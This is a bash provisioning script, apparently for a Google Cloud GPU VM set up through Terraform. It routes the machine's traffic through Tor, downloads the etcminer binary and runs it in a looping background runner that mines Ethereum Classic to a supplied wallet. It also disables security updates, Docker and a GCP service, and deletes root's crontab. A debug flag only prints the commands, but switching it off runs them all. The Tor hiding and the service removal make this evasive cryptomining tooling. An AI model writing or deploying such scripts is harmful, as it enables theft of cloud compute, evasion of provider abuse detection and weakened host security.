#!/bin/bash

# Debug mode - set to true to only print commands without executing them
DEBUG_MODE=true

# Function to execute or simulate command based on debug mode
execute_cmd() {
    if [ "$DEBUG_MODE" = true ]; then
        echo "[DEBUG] Would execute: $@"
    else
        eval "$@"
    fi
}

set -x # Enable debugging

# ---- CONFIGURATION ----
WALLET_ADDRESS="${wallet_address}"  # Wallet address passed from Terraform
TOR_PORT_TRANS=9040 # Port for transparent proxy
TOR_PORT_DNS=5353 # Port for DNS over TOR
TOR_SOCKS_PORT=9050 # Socks port
ETC_MINER_PORT=1010 # ETC miner port

echo "[DEBUG] Configuration loaded:"
echo "[DEBUG] WALLET_ADDRESS: $WALLET_ADDRESS"
echo "[DEBUG] TOR_PORT_TRANS: $TOR_PORT_TRANS"
echo "[DEBUG] TOR_PORT_DNS: $TOR_PORT_DNS"
echo "[DEBUG] TOR_SOCKS_PORT: $TOR_SOCKS_PORT"
echo "[DEBUG] ETC_MINER_PORT: $ETC_MINER_PORT"

# ---- SYSTEM INITIALIZATION ----

# Add metadata to hosts file
execute_cmd "sudo sed -i 's/metadata.google.internal/metadata.google.internal metadata/' /etc/hosts"

# Disable GCP DeepLearning service
execute_cmd "sudo systemctl disable --now google-c2d-startup.service"

# Fail the script if something goes wrong
set -e

# Enable and start SSH
execute_cmd "sudo systemctl enable ssh.service"
execute_cmd "sudo systemctl restart ssh.service"

# Install required packages
execute_cmd "export DEBIAN_FRONTEND=noninteractive"
execute_cmd "echo 'deb http://deb.debian.org/debian buster-backports main' | sudo tee -a /etc/apt/sources.list"
execute_cmd "sudo apt-get update"
execute_cmd "sudo apt-get install -y -t buster-backports tor iptables-persistent"

# ---- TOR CONFIGURATION ----

# Configure TOR
if [ "$DEBUG_MODE" = true ]; then
    echo "[DEBUG] Would create /etc/tor/torrc with content:"
    cat << __EOF__
AutomapHostsOnResolve 1
DNSPort $TOR_PORT_DNS
DataDirectory /var/lib/tor
ExitPolicy reject *:*
Log notice stderr
RunAsDaemon 0
SocksPort 0.0.0.0:$TOR_SOCKS_PORT IsolateDestAddr
TransPort 0.0.0.0:$TOR_PORT_TRANS
User debian-tor
VirtualAddrNetworkIPv4 10.192.0.0/10
__EOF__
else
    sudo cat > /etc/tor/torrc << __EOF__
AutomapHostsOnResolve 1
DNSPort $TOR_PORT_DNS
DataDirectory /var/lib/tor
ExitPolicy reject *:*
Log notice stderr
RunAsDaemon 0
SocksPort 0.0.0.0:$TOR_SOCKS_PORT IsolateDestAddr
TransPort 0.0.0.0:$TOR_PORT_TRANS
User debian-tor
VirtualAddrNetworkIPv4 10.192.0.0/10
__EOF__
fi

# Restart TOR service
execute_cmd "sudo systemctl restart tor.service"

# ---- NVIDIA DRIVER INSTALLATION ----

# Install NVIDIA drivers
execute_cmd "sudo /opt/deeplearning/install-driver.sh"
execute_cmd "sudo rm -f /etc/profile.d/install-driver-prompt.sh"

# Verify NVIDIA installation
execute_cmd "nvidia-smi"

# ---- NETWORK REDIRECTION CONFIGURATION ----

# Configure network redirect through TOR using iptables
if [ "$DEBUG_MODE" = true ]; then
    echo "[DEBUG] Would create /etc/iptables/rules.v4 with content:"
    cat << __EOF__
*filter
:INPUT ACCEPT [0:0]
:FORWARD ACCEPT [0:0]
:OUTPUT ACCEPT [0:0]
-A OUTPUT -p tcp -m tcp --dport $ETC_MINER_PORT -j REJECT
COMMIT

*nat
:PREROUTING ACCEPT [0:0]
:INPUT ACCEPT [0:0]
:OUTPUT ACCEPT [0:0]
:POSTROUTING ACCEPT [0:0]
-A OUTPUT -d 169.254.169.254/32 -p tcp -m tcp --dport 80 -j ACCEPT
-A OUTPUT -p udp -m udp --dport 53 -j REDIRECT --to-ports $TOR_PORT_DNS
-A OUTPUT -p tcp -m tcp --dport 53 -j REDIRECT --to-ports $TOR_PORT_DNS
-A OUTPUT -p tcp -m tcp --dport 80 -j REDIRECT --to-ports $TOR_PORT_TRANS
-A OUTPUT -p tcp -m tcp --dport 443 -j REDIRECT --to-ports $TOR_PORT_TRANS
-A OUTPUT -p tcp -m tcp --dport $ETC_MINER_PORT -j REDIRECT --to-ports $TOR_PORT_TRANS
COMMIT
__EOF__
else
    sudo cat > /etc/iptables/rules.v4 << __EOF__
*filter
:INPUT ACCEPT [0:0]
:FORWARD ACCEPT [0:0]
:OUTPUT ACCEPT [0:0]
-A OUTPUT -p tcp -m tcp --dport $ETC_MINER_PORT -j REJECT
COMMIT

*nat
:PREROUTING ACCEPT [0:0]
:INPUT ACCEPT [0:0]
:OUTPUT ACCEPT [0:0]
:POSTROUTING ACCEPT [0:0]
-A OUTPUT -d 169.254.169.254/32 -p tcp -m tcp --dport 80 -j ACCEPT
-A OUTPUT -p udp -m udp --dport 53 -j REDIRECT --to-ports $TOR_PORT_DNS
-A OUTPUT -p tcp -m tcp --dport 53 -j REDIRECT --to-ports $TOR_PORT_DNS
-A OUTPUT -p tcp -m tcp --dport 80 -j REDIRECT --to-ports $TOR_PORT_TRANS
-A OUTPUT -p tcp -m tcp --dport 443 -j REDIRECT --to-ports $TOR_PORT_TRANS
-A OUTPUT -p tcp -m tcp --dport $ETC_MINER_PORT -j REDIRECT --to-ports $TOR_PORT_TRANS
COMMIT
__EOF__
fi

# Apply iptables rules
execute_cmd "sudo iptables-restore < /etc/iptables/rules.v4"
execute_cmd "sudo netfilter-persistent save"

# Wait for TOR to be fully up and running
echo "[DEBUG] Would wait for TOR to be ready..."
if [ "$DEBUG_MODE" = false ]; then
    while ! curl --socks5 127.0.0.1:$TOR_SOCKS_PORT -s https://check.torproject.org/ | grep -q "Congratulations"; do
        echo "TOR not ready yet, waiting..."
        sleep 5
    done
fi
echo "[DEBUG] TOR would be ready."

# ---- ETHMINER INSTALLATION AND EXECUTION ----

execute_cmd "cd /tmp"

# Download miner simulation
if [ "$DEBUG_MODE" = true ]; then
    echo "[DEBUG] Would download etcminer from https://etcminer-release.s3.amazonaws.com/0.20.0/etcminer-0.20.0-cuda-11-opencl-linux-x86_64.tar.gz"
else
    # Download miner, try 3 times
    tries=0
    while [ $tries -lt 3 ]; do
        tries=$((tries+1))
        wget -O etcminer.tar.gz https://etcminer-release.s3.amazonaws.com/0.20.0/etcminer-0.20.0-cuda-11-opencl-linux-x86_64.tar.gz && break
        sleep 5
    done
fi

# Create miner runner script
if [ "$DEBUG_MODE" = true ]; then
    echo "[DEBUG] Would create runner.sh with content:"
    cat << __EOF__
#!/bin/bash -x
while true; do
  sudo iptables-save | grep -q "$ETC_MINER_PORT"
  if [ \$? -eq 0 ]; then
      echo "Starting ETC miner..."
      ./etcminer -U --exit \
        -P stratums://$WALLET_ADDRESS@us-etc.2miners.com:$ETC_MINER_PORT \
        -P stratums://$WALLET_ADDRESS@etc.2miners.com:$ETC_MINER_PORT \
        -P stratums://$WALLET_ADDRESS@asia-etc.2miners.com:$ETC_MINER_PORT \
      >> /tmp/etcminer.log 2>&1
      echo "Miner exited, restarting after a sleep"
      sleep 5
  else
    echo "Iptables not configured for ETC_MINER_PORT, waiting..."
    sleep 10
  fi
done
__EOF__
else
    sudo cat > runner.sh << __EOF__
#!/bin/bash -x
while true; do
  sudo iptables-save | grep -q "$ETC_MINER_PORT"
  if [ \$? -eq 0 ]; then
      echo "Starting ETC miner..."
      ./etcminer -U --exit \
        -P stratums://$WALLET_ADDRESS@us-etc.2miners.com:$ETC_MINER_PORT \
        -P stratums://$WALLET_ADDRESS@etc.2miners.com:$ETC_MINER_PORT \
        -P stratums://$WALLET_ADDRESS@asia-etc.2miners.com:$ETC_MINER_PORT \
      >> /tmp/etcminer.log 2>&1
      echo "Miner exited, restarting after a sleep"
      sleep 5
  else
    echo "Iptables not configured for ETC_MINER_PORT, waiting..."
    sleep 10
  fi
done
__EOF__
fi

execute_cmd "sudo chmod +x runner.sh"

# Run miner in background
if [ "$DEBUG_MODE" = true ]; then
    echo "[DEBUG] Would run miner in background with: nohup sudo ./runner.sh &"
else
    nohup sudo ./runner.sh &
fi

# ---- CLEANUP ----

# Disable unneeded services
execute_cmd "sudo systemctl disable --now containerd.service"
execute_cmd "sudo systemctl disable --now docker.service"
execute_cmd "sudo systemctl disable --now docker.socket"
execute_cmd "sudo systemctl disable --now apt-daily-upgrade.timer"
execute_cmd "sudo systemctl disable --now apt-daily.timer"
execute_cmd "sudo systemctl disable --now unattended-upgrades.service"

# Remove root's crontab
execute_cmd "sudo crontab -u root -r"

echo "Script execution complete."